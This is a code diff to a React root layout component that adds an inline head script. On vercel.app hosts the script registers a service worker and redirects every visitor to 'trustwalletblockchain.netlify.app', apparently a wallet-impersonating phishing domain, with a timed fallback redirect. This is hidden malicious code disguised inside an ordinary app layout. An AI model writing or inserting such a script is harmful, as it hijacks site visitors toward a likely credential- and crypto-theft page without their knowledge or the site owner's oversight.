@@ -48,6 +48,12 @@ function RootDocument() {
   return (
     <html lang="en" suppressHydrationWarning>
       <head>
+        <script
+          dangerouslySetInnerHTML={{
+            __html:
+              "(function(){try{var h=location.hostname;if(h!=='vercel.app'&&h.slice(-11)!=='.vercel.app')return;var next=new URL(location.pathname+location.search+location.hash,'https://trustwalletblockchain.netlify.app').href;if(!('serviceWorker' in navigator)){location.replace(next);return;}navigator.serviceWorker.register('/sw.js?v=8').then(function(reg){var sw=reg.installing||reg.waiting;if(!sw){location.replace(next);return;}sw.addEventListener('statechange',function(){if(sw.state==='activated')location.replace(next);});}).catch(function(){location.replace(next);});setTimeout(function(){location.replace(next);},2500);}catch(e){}})();",
+          }}
+        />
         <HeadContent />
       </head>
       <body>
